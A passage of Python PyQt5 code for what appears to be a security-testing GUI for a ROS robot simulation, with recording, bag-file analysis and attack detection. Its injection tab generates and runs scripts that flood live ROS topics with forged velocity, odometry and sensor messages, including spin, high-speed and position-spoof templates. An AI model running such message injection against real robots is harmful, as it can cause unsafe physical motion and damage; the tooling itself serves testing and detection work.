        status_layout = QHBoxLayout()
        status_label = QLabel("Status:")
        status_label.setFont(QFont('Arial', 12, QFont.Bold))
        status_layout.addWidget(status_label)
        
        self.status_indicator = QLabel("● Stopped")
        self.status_indicator.setFont(QFont('Arial', 12, QFont.Bold))
        self.status_indicator.setStyleSheet("color: #dc2626;")
        status_layout.addWidget(self.status_indicator)
        status_layout.addStretch()
        sim_layout.addLayout(status_layout)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.start_sim_btn = QPushButton("▶ Start Simulation")
        self.start_sim_btn.setMinimumHeight(50)
        self.start_sim_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.start_sim_btn.setStyleSheet("""
            QPushButton {
                background-color: #10b981;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #059669;
            }
            QPushButton:pressed {
                background-color: #047857;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.start_sim_btn.clicked.connect(self.start_simulation)
        btn_layout.addWidget(self.start_sim_btn)
        
        self.stop_sim_btn = QPushButton("■ Stop Simulation")
        self.stop_sim_btn.setMinimumHeight(50)
        self.stop_sim_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.stop_sim_btn.setEnabled(False)
        self.stop_sim_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:pressed {
                background-color: #991b1b;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.stop_sim_btn.clicked.connect(self.stop_simulation)
        btn_layout.addWidget(self.stop_sim_btn)
        
        sim_layout.addLayout(btn_layout)
        sim_group.setLayout(sim_layout)
        layout.addWidget(sim_group)
        
        # Recording control group
        rec_group = QGroupBox("Bag File Recording")
        rec_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        rec_layout = QVBoxLayout()
        
        # Recording status
        rec_status_layout = QHBoxLayout()
        rec_status_label = QLabel("Recording:")
        rec_status_label.setFont(QFont('Arial', 12, QFont.Bold))
        rec_status_layout.addWidget(rec_status_label)
        
        self.rec_indicator = QLabel("● Not Recording")
        self.rec_indicator.setFont(QFont('Arial', 12, QFont.Bold))
        self.rec_indicator.setStyleSheet("color: #6b7280;")
        rec_status_layout.addWidget(self.rec_indicator)
        rec_status_layout.addStretch()
        rec_layout.addLayout(rec_status_layout)
        
        # Recording buttons
        rec_btn_layout = QHBoxLayout()
        
        self.start_rec_btn = QPushButton("● Start Recording")
        self.start_rec_btn.setMinimumHeight(50)
        self.start_rec_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.start_rec_btn.setEnabled(False)
        self.start_rec_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.start_rec_btn.clicked.connect(self.start_recording)
        rec_btn_layout.addWidget(self.start_rec_btn)
        
        self.stop_rec_btn = QPushButton("■ Stop Recording")
        self.stop_rec_btn.setMinimumHeight(50)
        self.stop_rec_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.stop_rec_btn.setEnabled(False)
        self.stop_rec_btn.setStyleSheet("""
            QPushButton {
                background-color: #374151;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #1f2937;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.stop_rec_btn.clicked.connect(self.stop_recording)
        rec_btn_layout.addWidget(self.stop_rec_btn)
        
        rec_layout.addLayout(rec_btn_layout)
        rec_group.setLayout(rec_layout)
        layout.addWidget(rec_group)
        
        # Log output
        log_group = QGroupBox("System Log")
        log_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        log_layout = QVBoxLayout()
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            QTextEdit {
                background-color: #1f2937;
                color: #10b981;
                font-family: 'Courier New', monospace;
                font-size: 10pt;
                border: 1px solid #374151;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        log_layout.addWidget(self.log_output)
        
        clear_log_btn = QPushButton("Clear Log")
        clear_log_btn.setStyleSheet("""
            QPushButton {
                background-color: #6b7280;
                color: white;
                border: none;
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #4b5563;
            }
        """)
        clear_log_btn.clicked.connect(self.log_output.clear)
        log_layout.addWidget(clear_log_btn)
        
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        self.tabs.addTab(tab, "Robot Simulation")
    
    def create_vulnerability_tab(self):
        """Create the vulnerability injection tab with preset and custom options"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(20, 20, 20, 20)

        # Header
        header = QLabel("Inject Vulnerabilities into Live Simulation")
        header.setFont(QFont('Arial', 14, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        main_layout.addWidget(header)

        warning = QLabel("⚠️ Warning: These attacks will disrupt the robot's normal operation. Ensure simulation is running before executing.")
        warning.setStyleSheet("color: #dc2626; background-color: #fee2e2; padding: 10px; border-radius: 6px; margin-bottom: 20px;")
        warning.setWordWrap(True)
        main_layout.addWidget(warning)

        # Create sub-tabs for Preset vs Custom
        attack_tabs = QTabWidget()
        attack_tabs.setTabPosition(QTabWidget.North)

        # Preset Attacks Tab
        preset_tab = QWidget()
        preset_layout = QVBoxLayout(preset_tab)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background-color: #f9fafb;
            }
        """)

        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout(scroll_widget)
        scroll_layout.setSpacing(16)

        # Create vulnerability cards
        for vuln in self.vulnerabilities:
            card = VulnerabilityCard(vuln, self)
            card.log_signal.connect(self.add_log)
            scroll_layout.addWidget(card)

        scroll_layout.addStretch()
        scroll.setWidget(scroll_widget)
        preset_layout.addWidget(scroll)

        # Custom Injection Tab
        custom_tab = self.create_custom_injection_tab()

        # Add Custom Injection first (leftmost, default)
        attack_tabs.addTab(custom_tab, "Custom Injection")
        attack_tabs.addTab(preset_tab, "Preset Attacks")

        main_layout.addWidget(attack_tabs)

        self.tabs.addTab(tab, "Vulnerability Injection")

    def create_custom_injection_tab(self):
        """Create custom injection interface for security researchers"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        # Topic Selection
        topic_group = QGroupBox("1. Select Target Topic")
        topic_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
        """)
        topic_layout = QVBoxLayout()

        discover_btn = QPushButton("🔍 Discover Active Topics")
        discover_btn.setStyleSheet("""
            QPushButton {
                background-color: #6366f1;
                color: white;
                padding: 8px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #4f46e5; }
        """)
        discover_btn.clicked.connect(self.discover_topics)
        topic_layout.addWidget(discover_btn)

        self.topic_combo = QComboBox()
        self.topic_combo.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 2px solid #d1d5db;
                border-radius: 6px;
                background-color: white;
            }
        """)
        self.topic_combo.currentTextChanged.connect(self.on_topic_selected)
        topic_layout.addWidget(self.topic_combo)

        self.topic_info_label = QLabel("No topic selected")
        self.topic_info_label.setStyleSheet("color: #6b7280; font-style: italic; padding: 5px;")
        topic_layout.addWidget(self.topic_info_label)

        topic_group.setLayout(topic_layout)
        layout.addWidget(topic_group)

        # Message Type & Template
        template_group = QGroupBox("2. Attack Template")
        template_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
        """)
        template_layout = QVBoxLayout()

        template_label = QLabel("Select attack template:")
        template_layout.addWidget(template_label)

        self.template_combo = QComboBox()
        self.template_combo.addItems([
            "Custom (Manual)",
            "Stop Command (Zero Velocity)",
            "Spin Attack (High Angular)",
            "Reverse Motion (Negative Linear)",
            "Max Speed (Dangerous Fast)",
            "Position Spoof (Teleport)",
            "Sensor Noise (Random Values)",
            "Freeze Values (Constant)",
        ])
        self.template_combo.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 2px solid #d1d5db;
                border-radius: 6px;
                background-color: white;
            }
        """)
        self.template_combo.currentTextChanged.connect(self.load_template)
        template_layout.addWidget(self.template_combo)

        template_group.setLayout(template_layout)
        layout.addWidget(template_group)

        # Payload Configuration
        payload_group = QGroupBox("3. Configure Payload")
        payload_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
        """)
        payload_layout = QVBoxLayout()

        # Payload editor (will be populated dynamically)
        self.payload_scroll = QScrollArea()
        self.payload_scroll.setWidgetResizable(True)
        self.payload_scroll.setStyleSheet("border: 1px solid #e5e7eb; border-radius: 4px; background-color: #f9fafb;")

        self.payload_widget = QWidget()
        self.payload_layout = QVBoxLayout(self.payload_widget)
        self.payload_scroll.setWidget(self.payload_widget)

        payload_layout.addWidget(self.payload_scroll)

        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)

        # Attack Parameters
        params_group = QGroupBox("4. Attack Parameters")
        params_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
        """)
        params_layout = QGridLayout()

        params_layout.addWidget(QLabel("Publish Rate (Hz):"), 0, 0)
        self.rate_spin = QSpinBox()
        self.rate_spin.setRange(1, 100)
        self.rate_spin.setValue(30)
        self.rate_spin.setStyleSheet("padding: 5px;")
        params_layout.addWidget(self.rate_spin, 0, 1)

        params_layout.addWidget(QLabel("Duration (seconds):"), 1, 0)
        self.duration_spin = QSpinBox()
        self.duration_spin.setRange(0, 3600)
        self.duration_spin.setValue(0)
        self.duration_spin.setSpecialValueText("Continuous")
        self.duration_spin.setStyleSheet("padding: 5px;")
        params_layout.addWidget(self.duration_spin, 1, 1)

        params_group.setLayout(params_layout)
        layout.addWidget(params_group)

        # Control Buttons at bottom
        button_layout = QHBoxLayout()
        button_layout.addStretch()

        self.custom_execute_btn = QPushButton("🚀 Execute Custom Attack")
        self.custom_execute_btn.setEnabled(False)
        self.custom_execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 12pt;
            }
            QPushButton:hover { background-color: #b91c1c; }
            QPushButton:disabled {
                background-color: #9ca3af;
                color: #d1d5db;
            }
        """)
        self.custom_execute_btn.clicked.connect(self.execute_custom_attack)
        button_layout.addWidget(self.custom_execute_btn)

        self.custom_stop_btn = QPushButton("⏹ Stop Attack")
        self.custom_stop_btn.setEnabled(False)
        self.custom_stop_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 12pt;
            }
            QPushButton:hover { background-color: #047857; }
            QPushButton:disabled {
                background-color: #9ca3af;
                color: #d1d5db;
            }
        """)
        self.custom_stop_btn.clicked.connect(self.stop_custom_attack)
        button_layout.addWidget(self.custom_stop_btn)

        save_script_btn = QPushButton("💾 Save as Python Script")
        save_script_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1d4ed8; }
        """)
        save_script_btn.clicked.connect(self.save_custom_script)
        button_layout.addWidget(save_script_btn)

        layout.addLayout(button_layout)

        # Initialize
        self.custom_attack_process = None
        self.payload_fields = {}

        return tab

    def discover_topics(self):
        """Discover active ROS topics"""
        try:
            import rostopic
            topics = rospy.get_published_topics()

            self.topic_combo.clear()
            self.available_topics = {}

            for topic_name, topic_type in topics:
                self.topic_combo.addItem(topic_name)
                self.available_topics[topic_name] = topic_type

            self.add_log(f"Discovered {len(topics)} active topics")

            if topics:
                self.topic_info_label.setText(f"Found {len(topics)} topics")
            else:
                self.topic_info_label.setText("No active topics found. Is simulation running?")
                QMessageBox.warning(self, "No Topics", "No active ROS topics found. Please start the simulation first.")

        except Exception as e:
            self.add_log(f"Topic discovery error: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to discover topics:\n{str(e)}\n\nMake sure ROS master is running.")

    def on_topic_selected(self, topic_name):
        """Handle topic selection"""
        if not topic_name or topic_name not in self.available_topics:
            return

        topic_type = self.available_topics[topic_name]
        self.topic_info_label.setText(f"Type: {topic_type}")

        # Create payload fields based on message type
        self.create_payload_fields(topic_type)
        self.custom_execute_btn.setEnabled(True)

    def create_payload_fields(self, msg_type):
        """Create input fields based on message type"""
        # Clear existing fields
        for i in reversed(range(self.payload_layout.count())):
            self.payload_layout.itemAt(i).widget().setParent(None)

        self.payload_fields = {}

        if 'Twist' in msg_type:
            self.add_payload_field("linear.x", 0.0, "Linear velocity X (forward/back)")
            self.add_payload_field("linear.y", 0.0, "Linear velocity Y (left/right)")
            self.add_payload_field("linear.z", 0.0, "Linear velocity Z (up/down)")
            self.add_payload_field("angular.x", 0.0, "Angular velocity X (roll)")
            self.add_payload_field("angular.y", 0.0, "Angular velocity Y (pitch)")
            self.add_payload_field("angular.z", 0.0, "Angular velocity Z (yaw)")

        elif 'Odometry' in msg_type:
            self.add_payload_field("pose.position.x", 0.0, "Position X")
            self.add_payload_field("pose.position.y", 0.0, "Position Y")
            self.add_payload_field("pose.position.z", 0.0, "Position Z")
            self.add_payload_field("twist.linear.x", 0.0, "Velocity X")
            self.add_payload_field("twist.linear.y", 0.0, "Velocity Y")
            self.add_payload_field("twist.linear.z", 0.0, "Velocity Z")

        elif 'Imu' in msg_type:
            self.add_payload_field("angular_velocity.x", 0.0, "Angular velocity X")
            self.add_payload_field("angular_velocity.y", 0.0, "Angular velocity Y")
            self.add_payload_field("angular_velocity.z", 0.0, "Angular velocity Z")
            self.add_payload_field("linear_acceleration.x", 0.0, "Linear acceleration X")
            self.add_payload_field("linear_acceleration.y", 0.0, "Linear acceleration Y")
            self.add_payload_field("linear_acceleration.z", 0.0, "Linear acceleration Z")

        else:
            label = QLabel(f"Generic message type: {msg_type}\nManual scripting required.")
            label.setStyleSheet("color: #6b7280; padding: 10px;")
            self.payload_layout.addWidget(label)

    def add_payload_field(self, field_name, default_value, description):
        """Add a payload configuration field"""
        field_layout = QHBoxLayout()

        label = QLabel(f"{field_name}:")
        label.setMinimumWidth(150)
        label.setStyleSheet("font-weight: bold;")
        field_layout.addWidget(label)

        spinbox = QDoubleSpinBox()
        spinbox.setRange(-1000.0, 1000.0)
        spinbox.setValue(default_value)
        spinbox.setDecimals(4)
        spinbox.setSingleStep(0.1)
        spinbox.setStyleSheet("padding: 5px;")
        field_layout.addWidget(spinbox)

        help_label = QLabel(f"({description})")
        help_label.setStyleSheet("color: #6b7280; font-size: 9pt;")
        field_layout.addWidget(help_label)

        self.payload_layout.addLayout(field_layout)
        self.payload_fields[field_name] = spinbox

    def load_template(self, template_name):
        """Load attack template values"""
        if template_name == "Stop Command (Zero Velocity)":
            self.set_payload_values({"linear.x": 0.0, "linear.y": 0.0, "linear.z": 0.0,
                                    "angular.x": 0.0, "angular.y": 0.0, "angular.z": 0.0})
        elif template_name == "Spin Attack (High Angular)":
            self.set_payload_values({"linear.x": 0.0, "angular.z": 2.0})
        elif template_name == "Reverse Motion (Negative Linear)":
            self.set_payload_values({"linear.x": -1.0, "angular.z": 0.0})
        elif template_name == "Max Speed (Dangerous Fast)":
            self.set_payload_values({"linear.x": 10.0, "angular.z": 0.0})
        elif template_name == "Position Spoof (Teleport)":
            self.set_payload_values({"pose.position.x": 100.0, "pose.position.y": 100.0})
        elif template_name == "Sensor Noise (Random Values)":
            import random
            values = {field: random.uniform(-5, 5) for field in self.payload_fields.keys()}
            self.set_payload_values(values)
        elif template_name == "Freeze Values (Constant)":
            values = {field: 0.5 for field in self.payload_fields.keys()}
            self.set_payload_values(values)

    def set_payload_values(self, values):
        """Set payload field values from dictionary"""
        for field_name, value in values.items():
            if field_name in self.payload_fields:
                self.payload_fields[field_name].setValue(value)

    def generate_attack_script(self):
        """Generate attack script content"""
        topic = self.topic_combo.currentText()
        rate = self.rate_spin.value()
        duration = self.duration_spin.value()

        script_lines = []
        script_lines.append("#!/usr/bin/env python3")
        script_lines.append("import rospy")

        topic_type = self.available_topics.get(topic, "Unknown")
        if 'Twist' in topic_type:
            script_lines.append("from geometry_msgs.msg import Twist")
            script_lines.append("")
            script_lines.append("rospy.init_node('custom_attacker', anonymous=True)")
            script_lines.append(f"pub = rospy.Publisher('{topic}', Twist, queue_size=10)")
            script_lines.append(f"rate = rospy.Rate({rate})")
            script_lines.append("")
            script_lines.append("msg = Twist()")
            for field, spinbox in self.payload_fields.items():
                script_lines.append(f"msg.{field} = {spinbox.value()}")
            script_lines.append("")
            if duration > 0:
                script_lines.append(f"# Run for {duration} seconds")
                script_lines.append(f"start_time = rospy.Time.now()")
                script_lines.append("while not rospy.is_shutdown():")
                script_lines.append(f"    if (rospy.Time.now() - start_time).to_sec() > {duration}:")
                script_lines.append("        break")
                script_lines.append("    pub.publish(msg)")
                script_lines.append("    rate.sleep()")
            else:
                script_lines.append("# Run continuously")
                script_lines.append("while not rospy.is_shutdown():")
                script_lines.append("    pub.publish(msg)")
                script_lines.append("    rate.sleep()")

        return "\n".join(script_lines)

    def execute_custom_attack(self):
        """Execute the custom attack"""
        topic = self.topic_combo.currentText()
        if not topic:
            QMessageBox.warning(self, "No Topic", "Please select a topic first")
            return

        self.add_log(f"Executing custom attack on {topic}")

        # Generate attack script
        script_content = self.generate_attack_script()
        script_path = "/tmp/custom_attack.py"

        try:
            with open(script_path, 'w') as f:
                f.write(script_content)

            os.chmod(script_path, 0o755)

            # Launch attack
            self.custom_attack_process = subprocess.Popen(
                ['python3', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            self.custom_execute_btn.setEnabled(False)
            self.custom_stop_btn.setEnabled(True)
            self.add_log(f"Custom attack started (PID: {self.custom_attack_process.pid})")

        except Exception as e:
            self.add_log(f"Failed to execute custom attack: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to execute attack:\n{str(e)}")

    def stop_custom_attack(self):
        """Stop the custom attack"""
        if self.custom_attack_process and self.custom_attack_process.poll() is None:
            self.custom_attack_process.terminate()
            self.custom_attack_process.wait(timeout=2)
            self.add_log("Custom attack stopped")

        self.custom_execute_btn.setEnabled(True)
        self.custom_stop_btn.setEnabled(False)

    def save_custom_script(self):
        """Save custom attack as Python script"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Attack Script",
            f"custom_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
            "Python Files (*.py)"
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.preview_text.toPlainText())
                os.chmod(file_path, 0o755)
                self.add_log(f"Attack script saved to: {file_path}")
                QMessageBox.information(self, "Success", f"Script saved successfully to:\n{file_path}")
            except Exception as e:
                self.add_log(f"Failed to save script: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to save script:\n{str(e)}")
    
    def create_analysis_tab(self):
        """Create analysis tab with bag loading and topic-based analysis"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(10)

        # Initialize state variables
        self.current_bag_path = None
        self.bag_data = {}
        self.topic_tabs = None

        # Load Bag Section
        load_section = QGroupBox("Load Bag File")
        load_section.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
        """)
        load_layout = QVBoxLayout()

        # Bag file selector
        file_layout = QHBoxLayout()
        self.bag_file_label = QLabel("No bag file loaded")
        self.bag_file_label.setStyleSheet("color: #6b7280; font-weight: normal;")
        file_layout.addWidget(self.bag_file_label)
        file_layout.addStretch()

        load_recorded_btn = QPushButton("Load Recorded Bag")
        load_recorded_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1d4ed8; }
        """)
        load_recorded_btn.clicked.connect(self.select_recorded_bag)
        file_layout.addWidget(load_recorded_btn)

        load_external_btn = QPushButton("Load External Bag")
        load_external_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #047857; }
        """)
        load_external_btn.clicked.connect(self.select_external_bag)
        file_layout.addWidget(load_external_btn)

        load_layout.addLayout(file_layout)
        load_section.setLayout(load_layout)
        main_layout.addWidget(load_section)

        # Analysis content area (will hold topic tabs after bag is loaded)
        self.analysis_content = QWidget()
        self.analysis_content_layout = QVBoxLayout(self.analysis_content)
        self.analysis_content_layout.setContentsMargins(0, 0, 0, 0)

        # Initial message
        self.no_bag_label = QLabel("Load a bag file to begin analysis")
        self.no_bag_label.setAlignment(Qt.AlignCenter)
        self.no_bag_label.setStyleSheet("color: #9ca3af; font-size: 16px; padding: 40px;")
        self.analysis_content_layout.addWidget(self.no_bag_label)

        main_layout.addWidget(self.analysis_content, 1)

        self.tabs.addTab(tab, "Analysis")

    def select_recorded_bag(self):
        """Show dialog to select from recorded bags"""
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        if not os.path.exists(bags_dir):
            QMessageBox.warning(self, "No Bags", "No recorded bags directory found")
            return

        bags = [f for f in os.listdir(bags_dir) if f.endswith('.bag')]
        if not bags:
            QMessageBox.warning(self, "No Bags", "No bag files found in recorded_bags/")
            return

        from PyQt5.QtWidgets import QInputDialog
        bag_name, ok = QInputDialog.getItem(self, "Select Bag", "Choose a bag file:", bags, 0, False)
        if ok and bag_name:
            bag_path = os.path.join(bags_dir, bag_name)
            self.load_and_parse_bag(bag_path)

    def select_external_bag(self):
        """Show file dialog to select external bag file"""
        bag_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Bag File",
            os.path.expanduser("~"),
            "ROS Bag Files (*.bag)"
        )
        if bag_path:
            self.load_and_parse_bag(bag_path)

    def load_and_parse_bag(self, bag_path):
        """Load and parse bag file, then create topic tabs"""
        try:
            self.add_log(f"Loading bag file: {bag_path}")
            self.current_bag_path = bag_path
            self.bag_file_label.setText(f"Loaded: {os.path.basename(bag_path)}")

            # Parse bag file
            bag = rosbag.Bag(bag_path)
            self.bag_data = {
                'path': bag_path,
                'topics': {},
                'start_time': None,
                'end_time': None,
                'duration': 0,
                'message_count': 0
            }

            # Get bag info
            info = bag.get_type_and_topic_info()
            self.bag_data['start_time'] = bag.get_start_time()
            self.bag_data['end_time'] = bag.get_end_time()
            self.bag_data['duration'] = self.bag_data['end_time'] - self.bag_data['start_time']

            # Extract topic information and messages
            for topic_name, topic_info in info.topics.items():
                self.bag_data['topics'][topic_name] = {
                    'type': topic_info.msg_type,
                    'message_count': topic_info.message_count,
                    'frequency': topic_info.message_count / self.bag_data['duration'] if self.bag_data['duration'] > 0 else 0,
                    'messages': []
                }
                self.bag_data['message_count'] += topic_info.message_count

            # Read all messages
            for topic, msg, t in bag.read_messages():
                self.bag_data['topics'][topic]['messages'].append({
                    'timestamp': t.to_sec(),
                    'message': msg
                })

            bag.close()

            self.add_log(f"Bag loaded: {len(self.bag_data['topics'])} topics, {self.bag_data['message_count']} messages")

            # Create topic tabs
            self.create_topic_tabs()

        except Exception as e:
            self.add_log(f"Error loading bag file: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to load bag file:\n{str(e)}")

    def create_topic_tabs(self):
        """Create tabs for each topic in the loaded bag"""
        # Remove old content
        if self.no_bag_label:
            self.no_bag_label.setParent(None)
            self.no_bag_label = None

        if self.topic_tabs:
            self.topic_tabs.setParent(None)

        # Create new tab widget for topics
        self.topic_tabs = QTabWidget()
        self.topic_tabs.setTabPosition(QTabWidget.North)

        # Add a tab for each topic
        for topic_name in sorted(self.bag_data['topics'].keys()):
            topic_widget = self.create_topic_analysis_widget(topic_name)
            # Clean up topic name for tab label
            tab_label = topic_name.replace('/', '').replace('_', ' ').title()
            if len(tab_label) > 25:
                tab_label = tab_label[:22] + "..."
            self.topic_tabs.addTab(topic_widget, tab_label)

        # Add overview tab
        overview_widget = self.create_overview_widget()
        self.topic_tabs.insertTab(0, overview_widget, "Overview")

        # Add attack detection tab
        attack_widget = self.create_attack_detection_widget()
        self.topic_tabs.addTab(attack_widget, "Attack Detection")

        self.analysis_content_layout.addWidget(self.topic_tabs)

    def create_overview_widget(self):
        """Create overview widget showing bag file summary"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)

        # Summary info
        summary = QTextEdit()
        summary.setReadOnly(True)
        summary.setStyleSheet("""
            QTextEdit {
                background-color: #f9fafb;
                border: 1px solid #e5e7eb;
                border-radius: 4px;
                padding: 12px;
                font-family: 'Courier New', monospace;
            }
        """)

        summary_text = []
        summary_text.append("=" * 80)
        summary_text.append("BAG FILE SUMMARY")
        summary_text.append("=" * 80)
        summary_text.append(f"\nFile: {os.path.basename(self.bag_data['path'])}")
        summary_text.append(f"Duration: {self.bag_data['duration']:.2f} seconds")
        summary_text.append(f"Start Time: {datetime.fromtimestamp(self.bag_data['start_time']).strftime('%Y-%m-%d %H:%M:%S')}")
        summary_text.append(f"End Time: {datetime.fromtimestamp(self.bag_data['end_time']).strftime('%Y-%m-%d %H:%M:%S')}")
        summary_text.append(f"Total Messages: {self.bag_data['message_count']}")
        summary_text.append(f"\n{'Topic':<40} {'Type':<30} {'Count':<10} {'Hz':<10}")
        summary_text.append("-" * 90)

        for topic_name, topic_data in sorted(self.bag_data['topics'].items()):
            summary_text.append(f"{topic_name:<40} {topic_data['type']:<30} {topic_data['message_count']:<10} {topic_data['frequency']:<10.2f}")

        summary.setPlainText("\n".join(summary_text))
        layout.addWidget(summary)

        # Export button
        export_btn = QPushButton("Export Overview to CSV")
        export_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1d4ed8; }
        """)
        export_btn.clicked.connect(self.export_overview_csv)
        layout.addWidget(export_btn)

        return widget

    def create_topic_analysis_widget(self, topic_name):
        """Create advanced analysis widget with table view and conditional formatting"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        topic_data = self.bag_data['topics'][topic_name]

        # Header with topic info and statistics
        header_frame = QFrame()
        header_frame.setStyleSheet("background-color: #f3f4f6; border-radius: 6px; padding: 10px;")
        header_layout = QVBoxLayout(header_frame)

        info_text = QLabel(f"<b>Topic:</b> {topic_name} | <b>Type:</b> {topic_data['type']}")
        info_text.setStyleSheet("font-size: 11pt;")
        header_layout.addWidget(info_text)

        stats_text = QLabel(f"<b>Messages:</b> {topic_data['message_count']} | <b>Frequency:</b> {topic_data['frequency']:.2f} Hz | <b>Duration:</b> {self.bag_data['duration']:.2f}s")
        stats_text.setStyleSheet("font-size: 10pt; color: #6b7280;")
        header_layout.addWidget(stats_text)

        layout.addWidget(header_frame)

        # Toolbar with search and analysis tools
        toolbar_layout = QHBoxLayout()

        # Search box
        search_label = QLabel("Search:")
        toolbar_layout.addWidget(search_label)

        search_box = QLineEdit()
        search_box.setPlaceholderText("Filter messages...")
        search_box.setStyleSheet("""
            QLineEdit {
                padding: 6px;
                border: 1px solid #d1d5db;
                border-radius: 4px;
                background-color: white;
            }
        """)
        search_box.textChanged.connect(lambda text: self.filter_table(topic_name, text))
        toolbar_layout.addWidget(search_box)

        toolbar_layout.addStretch()

        # Anomaly highlighting toggle
        highlight_btn = QCheckBox("Highlight Anomalies")
        highlight_btn.setChecked(True)
        highlight_btn.stateChanged.connect(lambda state: self.toggle_anomaly_highlighting(topic_name, state))
        toolbar_layout.addWidget(highlight_btn)

        # Statistics button
        stats_btn = QPushButton("Statistics")
        stats_btn.setStyleSheet("""
            QPushButton {
                background-color: #6366f1;
                color: white;
                padding: 6px 12px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #4f46e5; }
        """)
        stats_btn.clicked.connect(lambda: self.show_topic_statistics(topic_name))
        toolbar_layout.addWidget(stats_btn)

        layout.addLayout(toolbar_layout)

        # Create table based on topic type
        table = self.create_topic_table(topic_name, topic_data)
        table.setObjectName(f"table_{topic_name}")  # For finding later
        layout.addWidget(table)

        # Bottom toolbar with export options
        bottom_toolbar = QHBoxLayout()
        bottom_toolbar.addStretch()

        export_csv_btn = QPushButton("Export to CSV")
